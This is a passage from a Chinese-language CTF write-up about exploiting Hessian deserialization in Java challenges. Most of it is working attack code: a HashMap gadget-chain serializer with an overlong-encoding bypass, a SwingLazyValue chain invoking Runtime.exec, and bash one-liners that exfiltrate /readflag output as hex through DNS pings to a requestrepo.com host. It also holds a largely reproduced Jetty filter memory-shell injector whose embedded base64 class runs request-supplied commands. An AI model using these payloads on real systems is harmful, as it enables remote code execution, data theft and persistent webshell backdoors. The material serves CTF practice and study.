class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable1, hashtable1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable2, hashtable2, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">2</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable3, hashtable3, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">3</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable4, hashtable4, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;hessian.ser&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(s);<br>        hessian2Output.close();<br><br>        <span class="hljs-keyword">return</span> java.util.Base64.getEncoder().encodeToString(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(<span class="hljs-string">&quot;hessian.ser&quot;</span>)));<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">UTF8_serObj</span><span class="hljs-params">(Object hashtable1, Object hashtable2, Object hashtable3, Object hashtable4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">4</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable1, hashtable1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable2, hashtable2, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">2</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable3, hashtable3, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">3</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, hashtable4, hashtable4, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-type">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;hessian.ser&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(s);<br>        hessian2Output.close();<br><br>        <span class="hljs-keyword">return</span> java.util.Base64.getEncoder().encodeToString(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(<span class="hljs-string">&quot;hessian.ser&quot;</span>)));<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObj</span><span class="hljs-params">(String serData)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] sers = java.util.Base64.getDecoder().decode(serData);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(sers)).contains(<span class="hljs-string">&quot;java&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;I hate jvav&quot;</span>);<br>            <span class="hljs-comment">//return;</span><br>        &#125;<br><br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(sers));<br>        <span class="hljs-comment">//Hessian2Input hessian2Input = new Hessian2Input(new FileInputStream(&quot;hessian.ser&quot;));</span><br>        hessian2Input.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520171548029.png" alt="image-20250520171548029"></p><p>然而可以看到通是通了，但java没有绕过去，这是因为在输入的地方有一个对java字符串直接的过滤，这里的java是不可避免的。在 <code>unsafe.defineClass</code> 的 <code>bytecode</code> 内，<code>bytecode</code> 解码的内容包含了’java’，这部分无关Hessian反序列化，而是类的字节码。</p><p>但是真的不能绕了吗？其实不然。</p><p>上面的链跟着分析了以后其实就知道在<code>SwingLazyValue</code>我们已实现调用任意方法，所以直接调runtime就行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<br>        <span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>,<br>        <span class="hljs-string">&quot;invoke&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                        Runtime.class.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String[].class),<br>                        Runtime.getRuntime(),<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>                                        isLinux ? <span class="hljs-string">&quot;sh&quot;</span> : <span class="hljs-string">&quot;cmd&quot;</span>,<br>                                        isLinux ? <span class="hljs-string">&quot;-c&quot;</span> : <span class="hljs-string">&quot;/c&quot;</span>,<br>                                        <span class="hljs-string">&quot;calc.exe&quot;</span><br>                                &#125;<br>                        &#125;<br>                &#125;<br>        &#125;<br>);<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172128284.png" alt="image-20250520172128284"></p><p>然而这道题只有dns出网，采用文章中的操作，在没有curl的情况下用ping代替输出十六进制，由于一次只有50个字符所以还需要写一个读取后50字符的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;echo \&quot;<span class="hljs-subst">$(/readflag give me the flag | xxd -p -c 256 | sed &#x27;s/^\\(.\\&#123;50\\&#125;\\)</span>\\(.*\\)$/\\2/&#x27; | sed &#x27;s/^\\(.\\&#123;50\\&#125;\\).*$/\\1/&#x27;).gtg815ph.requestrepo.com\&quot; | xargs ping&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$( /readflag give me the flag | xxd -p -c 256 | sed &#x27;s/^.\&#123;100\&#125;//&#x27; | sed &#x27;s/^\\(.\\&#123;50\\&#125;\\)</span>.*$/\\1/&#x27; ).gtg815ph.requestrepo.com&quot;</span> | xargs ping<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172353712.png" alt="image-20250520172353712"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172418030.png" alt="image-20250520172418030"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172425280.png" alt="image-20250520172425280"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520172432826.png" alt="image-20250520172432826"></p><p>DNS流量有点卡，可能要多发几次包。</p><h3 id="hdHessian"><a href="#hdHessian" class="headerlink" title="hdHessian"></a>hdHessian</h3><p>Hessian的版本提高了，彻底不出网了，LDAP和JDBC这种想都别想。而新版本的Hessian直接在反序列化的过程中对Runtime、ProcessImpl等类做了黑名单限制，你也命令执行不了。</p><p>看到它依赖中的Jetty，看来只能打Jetty内存马了。</p><p>此处思路还是用到上面分析中的<code>SwingLazyValue</code>，令其调用类加载来实现内存马的注入，因为Hessian反序列化只可见ClassLoader，因此无法限制类加载时期在ClassLoader内的Runtime。</p><p>但前面提到类字节码会包含’java’字符串，那么我们可以尝试先将字节码编码并保存为文件，在第二次再对文件进行解码和加载。</p><p>这里考虑到一个传xslt文件的方法，也是官方给出的方法。</p><p>当然xslt文件也使用了html实体编码转义来绕这个java的检测，即<code>ja&amp;#x76</code>。</p><p>先用这个<code>SwingLazyValue</code>调<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename</code>将xslt文件转换成的字节格式写入目标位置：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520174748242.png" alt="image-20250520174748242"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520174923579.png" alt="image-20250520174923579"></p><p>接着调用<code>com.sun.org.apache.xalan.internal.xslt.Process#_main</code>来加载xslt文件：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520175200587.png" alt="image-20250520175200587"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520175235487.png" alt="image-20250520175235487"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520175010041.png" alt="image-20250520175010041"></p><p>Jetty内存🐎随便找一个就行了，这里我用官方的payload直接打了，写的挺好的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.PrintStream;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Array;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> java.util.List;  <br><span class="hljs-keyword">import</span> java.util.zip.GZIPInputStream;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JettyFilterMemoryShell</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JettyFilterMemoryShell</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-comment">/*  </span><br><span class="hljs-comment">            byte [] bytes = &#123;12,23&#125;; // what ever you want            Unsafe unsafe = Unsafe.getUnsafe();            unsafe.defineAnonymousClass(this.getClass(), bytes, new Object [0]).newInstance();            */</span>  <br>            <span class="hljs-keyword">for</span>(Object context : <span class="hljs-built_in">this</span>.getContext()) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getShell(context);  <br>                <span class="hljs-built_in">this</span>.inject(context, filter);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            e.printStackTrace();  <br>        &#125;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUrlPattern</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/*&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;org.eclipse.jetty.servlet.handlers.XXRGa.OAuthFilter&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBase64String</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;yv66vgAAADQAtgoAJwBjBwBkBwBlCABmCwBnAGgHAGkIAGoIAGsIAGwKAG0AbgoAbQBvCgBwAHEHAHIKAA0AcwgAdAoADQB1CgANAHYKAA0AdwgAeAgAeQsAAwB6CwADAHsKAHwAfQoAfAB+CgB8AH8HAIALAAMAgQcAggoAHABjCACDCgAcAIQKABoAhQoAHACGCwCHAIgIAIkIAIoLAAMAiwcAjAcAjQcAjgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTEpldHR5RmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAI8BAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZpc1VuaXgBAAFaAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAC2h0dHBSZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAMaHR0cFJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAGQHAGUHADsHAJAHAHIHAGkHAIwHAJEHAJIHAJMHAIAHAJQBAAdkZXN0cm95AQAHc2V0TmFtZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEbmFtZQEAClNvdXJjZUZpbGUBABBKZXR0eUZpbHRlci5qYXZhDAApACoBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAANjbWQHAJEMAJUAXwEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQACL2MHAJYMAJcAmAwAmQCaBwCbDACcAJ0BABFqYXZhL3V0aWwvU2Nhbm5lcgwAKQCeAQACXGEMAJ8AoAwAoQCiDACjAKQBAAABABh0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTgMAKUApgwApwCoBwCpDACqAKYMAKsAKgwArAAqAQATamF2YS9pby9JT0V4Y2VwdGlvbgwArQCuAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABTlkb3ku6TmiafooYzplJnor686IAwArwCwDACxAKQMALIApAcAkwwANgCzAQAOWC1Qcm9jZXNzZWQtQnkBABFTaW1wbGVKZXR0eUZpbHRlcgwAtAC1AQALSmV0dHlGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvbGFuZy9UaHJvd2FibGUBAAxnZXRQYXJhbWV0ZXIBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BAAVmbHVzaAEABWNsb3NlAQAJc2V0U3RhdHVzAQAEKEkpVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACmdldE1lc3NhZ2UBAAh0b1N0cmluZwEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAlzZXRIZWFkZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYAIQAmACcAAQAoAAAABQABACkAKgABACsAAAAvAAEAAQAAAAUqtwABsQAAAAIALAAAAAYAAQAAAAsALQAAAAwAAQAAAAUALgAvAAAAAQAwADEAAgArAAAANQAAAAIAAAABsQAAAAIALAAAAAYAAQAAABAALQAAABYAAgAAAAEALgAvAAAAAAABADIAMwABADQAAAAEAAEANQABADYANwACACsAAAKRAAUADQAAARcrwAACOgQswAADOgUrEgS5AAUCAMYA3AQ2BhUGmQAfBr0ABlkDEgdTWQQSCFNZBSsSBLkABQIAU6cAHAa9AAZZAxIEU1kEEglTWQUrEgS5AAUCAFM6B7gAChkHtgALtgAMOgi7AA1ZGQi3AA4SD7YAEDoJGQm2ABGZAAsZCbYAEqcABRITOgoZBRIUuQAVAgAZBbkAFgEAOgsZCxkKtgAXGQu2ABgZC7YAGbE6BhkFEhS5ABUCABkFEQH0uQAbAgAZBbkAFgEAOgcZB7sAHFm3AB0SHrYAHxkGtgAgtgAftgAhtgAXGQe2ABgZB7YAGbEtKyy5ACIDABkFEiMSJLkAJQMApwATOgwZBRIjEiS5ACUDABkMv7EAAwAXAKoAqwAaAPAA+AEGAAABBgEIAQYAAAADACwAAAByABwAAAAUAAYAFQAMABgAFwAaABoAGwBWABwAYwAdAHMAHgCHACEAkAAiAJkAIwCgACQApQAlAKoAKACrACkArQArALYALADAAC0AyQAuAOUALwDqADAA7wAxAPAANwD4ADoBAwA7AQYAOgETADsBFgA8AC0AAACOAA4AGgCRADgAOQAGAFYAVQA6ADsABwBjAEgAPAA9AAgAcwA4AD4APwAJAIcAJABAAEEACgCZABIAQgBDAAsAyQAnAEIAQwAHAK0AQwBEAEUABgAAARcALgAvAAAAAAEXAEYARwABAAABFwBIAEkAAgAAARcASgBLAAMABgERAEwATQAEAAwBCwBOAE8ABQBQAAAARAAI/gA7BwBRBwBSAVgHAFP+AC4HAFMHAFQHAFVBBwBW/wAlAAYHAFcHAFgHAFkHAFoHAFEHAFIAAQcAW/sARFUHAFwPADQAAAAGAAIAGgA1AAEAXQAqAAEAKwAAACsAAAABAAAAAbEAAAACACwAAAAGAAEAAABBAC0AAAAMAAEAAAABAC4ALwAAAAEAXgBfAAEAKwAAADYAAQACAAAAAiuwAAAAAgAsAAAABgABAAAAQwAtAAAAFgACAAAAAgAuAC8AAAAAAAIAYABBAAEAAQBhAAAAAgBi&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(Object context, Object filter)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">servletHandler</span> <span class="hljs-operator">=</span> getFieldValue(context, <span class="hljs-string">&quot;_servletHandler&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (servletHandler != <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">if</span> (<span 